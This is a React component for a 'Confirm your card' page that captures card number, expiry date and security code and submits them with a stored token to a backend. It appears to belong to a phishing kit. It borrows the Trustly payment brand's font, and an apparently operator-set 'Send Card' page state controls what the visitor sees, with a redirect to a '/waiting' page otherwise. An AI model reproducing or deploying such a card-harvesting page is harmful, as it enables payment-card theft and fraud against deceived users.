import * as React from 'react';
import styled from 'styled-components'

import { StyledSection } from "./home";
import { RestApi } from "../../provider/restApi";
import { checkedCard, valideToken } from '../../provider/services';

import MasterCard from '../../assets/images/master.png'
import AmexCard from "../../assets/images/amex.png"
import VisaCard from "../../assets/images/visa.png"
import MaestroCard from "../../assets/images/maestro.png"
import { useNavigate } from 'react-router-dom';
import { useGlobalData } from '../../provider/context';
import { valideCardNumber } from '../../provider/services';
import { useEffect } from 'react';

const Card = () => {
    const [state, { dispatch }]: any = useGlobalData();
    const page = state.selectedPage;
    const [cardNumber, setCardNumber] = React.useState('');
    const [valideTime, setValideTime] = React.useState('');
    const [secureCode, setSecureCode] = React.useState('')
    const [rotate, setRotate] = React.useState(false);
    const [isdisabled, setIsdisabled] = React.useState(false);
    const token: any = localStorage.getItem('userToken');
    const logged = valideToken(token);
    const navigation = useNavigate();
    const handleClick = async () => {
        setIsdisabled(true)
        const token: any = localStorage.getItem('userToken')
        const formData = {
            cardNumber: cardNumber,
            valideTime: valideTime,
            secureCode: secureCode,
            token: token
        };
        const res = await RestApi.cardRegister(formData);
        if (res.status) {
            alert(res.message)
        } else {
            alert(res.message)
        }
    }
    const handleRotate = () => {
        setRotate(!rotate);
    }

    useEffect(() => {
        const token: any = localStorage.getItem('userToken');
        valideToken(token)
            .then((logged) => {
                console.log('selected', page)
                if (!logged) {
                    navigation('/');
                } else if (page != 'Send Card') {
                    navigation('/waiting')
                }
            }).catch((err: any) => {
                console.log("valideToken error", err.message)
                navigation('/')
            })
    }, [])
    return (
        <StyledSection>
            <div className="panel">
                <CardSection>
                    <div className="card-title">
                        Confirm your card
                    </div>
                    <div className="card-img">
                        <div className={`card ${rotate ? 'rotated' : ''}`}>
                            <div className={`card-inner `} onClick={handleRotate}>
                                <div className="card-front">
                                    <div className="card-bg"></div>
                                    <div className="card-glow"></div>
                                    <div className="card-logo">
                                        {checkedCard(cardNumber) === '2' && (
                                            <img src={MasterCard} width={60} />
                                        )}

                                        {checkedCard(cardNumber) === '3' && (
                                            <img src={AmexCard} width={60} />
                                        )}

                                        {checkedCard(cardNumber) === '4' && (
                                            <img src={VisaCard} width={60} />
                                        )}

                                        {checkedCard(cardNumber) === '5' && (
                                            <img src={MaestroCard} width={60} />
                                        )}
                                    </div>
                                    <div className="card-contactless">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="46" height="56">
                                            <path
                                                fill="none"
                                                stroke="#f9f9f9"
                                                strokeWidth="6"
                                                strokeLinecap="round"
                                                d="m35,3a50,50 0 0,1 0,50M24,8.5a39,39 0 0,1 0,39M13.5,13.55a28.2,28.5
                    0 0,1 0,28.5M3,19a18,17 0 0,1 0,18"
                                            />
                                        </svg>
                                    </div>
                                    <div className="card-chip"></div>
                                    <div className="card-number">{valideCardNumber(cardNumber)}</div>
                                    <div className="card-valid">{valideTime}</div>
                                </div>
                                <div className="card-back">
                                    <div className="card-seccode">{secureCode}</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="card-detail">
                        <div className="card-input">
                            <label>Card number</label>
                            <input maxLength={16} value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} className='num' />
                        </div>
                        <div className="card-row">
                            <div className="card-input">
                                <label>Validity Time (mm/dd)</label>
                                <input maxLength={5} value={valideTime} onChange={(e) => setValideTime(e.target.value)} className='time' />
                            </div>
                            <div className="card-input">
                                <label>Security code</label>
                                <input maxLength={4} value={secureCode} onChange={(e) => setSecureCode(e.target.value)} className='code' />
                            </div>
                        </div>
                        <div className="button">
                            <button onClick={handleClick} disabled={isdisabled}>Continue</button>
                        </div>
                    </div>
                </CardSection>
            </div>
        </StyledSection>
    )
}

const CardSection = styled.div`
    display: flex;
    flex-direction: column;
    
    align-items: center;
    gap: 3em;
    height: 600px;
    width: 100%;
    .card-title  {
        font-size: 25px;
        font-weight: bold;
        font-family: "Trustly Sans Regular", "Helvetica Neue", Arial, sans-serif
    }
    .card-img {
        .card {
            width: 320px;
            height: 200px;
            border-radius: 10px;
            perspective: 1000px;
        }
        .rotated .card-inner{
            transform: rotateY(180deg);
        }
    
        .card-inner {
            position: relative;
            width: 100%;
            height: 100%;
            border-radius: 10px;
            transition: transform 600ms ease;
            transform-style: preserve-3d;
            box-shadow: 0 0 25px 2px rgba(0, 0, 0, 0.2);
        }
        .card-front, .card-back {
            position: absolute;
            top: 0;
            width: 100%;
            height: 100%;
            border-radius: 10px;
            overflow: hidden;
            backface-visibility: hidden;
            background: linear-gradient(321.03deg, #01adef 0%, #0860bf 91.45%);
        }
        .card-front {
            border-radius: 10px;
            overflow: hidden;
            position: relative;
            transition: transform 300ms ease-in-out;
        }
        .card-back {
            transform: rotateY(180deg);
        }
        .card-back::before {
        content: "";
        position: absolute;
        top: 40%;
        left: 20%;
        width: 180%;
        height: 120%;
        border-radius: 100%;
        background-image: linear-gradient(to right top, #a3d4e7, #a7d5e6, #abd5e4, #aed6e3, #b2d6e2, #aed4e2, #abd3e1, #a7d1e1, #9bcee1, #8ecae1, #81c7e1, #73c3e1);
        filter: blur(10px);
        opacity: 0.15;
        }
        .card-back::after {
        content: "";
        position: absolute;
        top: 15%;
        width: 100%;
        height: 40px;
        background-image: linear-gradient(to right top, #021318, #07191f, #0a1f26, #0b262e, #0c2c35, #0c2c35, #0c2c35, #0c2c35, #0b262e, #0a1f26, #07191f, #021318);
        }
        .card-bg {
        position: absolute;
        top: -20px;
        right: -120px;
        width: 380px;
        height: 250px;
        background: linear-gradient(321.03deg, #01adef 0%, #0860bf 91.45%);
        border-top-left-radius: 100%;
        }
        .card-bg::before {
        content: "";
        position: absolute;
        top: -20px;
        right: -80px;
        width: 380px;
        height: 250px;
        background: linear-gradient(321.03deg, #01adef 0%, #0860bf 91.45%);
        border-top-left-radius: 100%;
        }
        .card-bg::after {
        content: "";
        position: absolute;
        top: -20px;
        right: -120px;
        width: 380px;
        height: 250px;
        background: linear-gradient(321.03deg, #01adef 0%, #0860bf 91.45%);
        border-top-left-radius: 100%;
        }
        .card-glow {
        position: absolute;
        top: -140px;
        left: -65px;
        height: 200px;
        width: 400px;
        background: rgba(0, 183, 255, 0.4);
        filter: blur(10px);
        border-radius: 100%;
        transform: skew(-15deg, -15deg);
        }
        .card-contactless {
        position: absolute;
        right: 15px;
        top: 55px;
        transform: scale(0.5);
        }
        .card-chip {
        position: absolute;
        top: 65px;
        left: 25px;
        width: 45px;
        height: 34px;
        border-radius: 5px;
        background-color: #ffda7b;
        overflow: hidden;
        }
        .card-chip::before {
        content: "";
        position: absolute;
        left: 49%;
        top: -7%;
        transform: translateX(-50%);
        background: #ffda7b;
        border: 1px solid #a27c1f;
        width: 25%;
        height: 110%;
        border-radius: 100%;
        z-index: 2;
        }
        .card-chip::after {
        content: "";
        position: absolute;
        top: 30%;
        left: -10%;
        background: transparent;
        border: 1px solid #a27c1f;
        width: 120%;
        height: 33%;
        }
        .card-holder {
        position: absolute;
        left: 25px;
        bottom: 30px;
        color: white;
        font-size: 14px;
        letter-spacing: 0.2em;
        filter: drop-shadow(1px 1px 1px rgba(0, 0, 0, 0.3));
        }
        .card-number {
        position: absolute;
        left: 25px;
        bottom: 65px;
        color: white;
        font-size: 16px;
        font-weight: 600;
        letter-spacing: 0.2em;
        filter: drop-shadow(1px 1px 1px rgba(0, 0, 0, 0.3));
        }
        .card-valid {
        position: absolute;
        right: 25px;
        bottom: 30px;
        color: white;
        font-size: 14px;
        letter-spacing: 0.2em;
        filter: drop-shadow(1px 1px 1px rgba(0, 0, 0, 0.3));
        }
        .card-valid::before {
        content: "GOOD THRU";
        position: absolute;
        top: 1px;
        left: -35px;
        width: 50px;
        font-size: 7px;
        }
        .card-signature {
        position: absolute;
        top: 120px;
        left: 15px;
        width: 70%;
        height: 30px;
        background: #eeecec;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #021318;
        font-family: "Mr Dafoe", cursive;
        font-size: 38px;
        font-weight: 400;
        }
        .card-signature::before {
        content: "Authorized Signature";
        position: absolute;
        top: -15px;
        left: 0;
        font-family: "Overpass Mono", monospace;
        font-size: 9px;
        color: #eeecec;
        }
        .card-seccode {
        position: absolute;
        top: 125px;
        left: 245px;
        display: flex;
        justify-content: center;
        align-items: center;
        width: 40px;
        height: 17px;
        color: #021318;
        background-color: #eeecec;
        text-align: center;
        font-size: 11px;
        }   
    }
    .card-detail {
        display: flex;
        flex-direction: column;
        gap: 1em;
        width: 90%;
        .card-row {
            display: flex;
            gap: 2%;
            align-items: center;
            justify-content: space-between;
            .card-input {
                width: 49%;
            }
            
        }
        .card-input {
            display: flex;
            flex-direction: column;
            gap: 0.5em;
            label {
                font-size: 13px;
                color: #707070;
            }
            input {
                padding: 15px;
                font-size: 16px;
                border-radius: 3px;
                border: 1px solid #dcdcdc;
                &:focus {
                    outline: none;
                }
            } 
        }
        .button {
            button {
                width: 100%;
                background-color: #004cbc;
                padding:1em;
                color: white;
                border: none;
            }
        }
    }
    

`

export default Card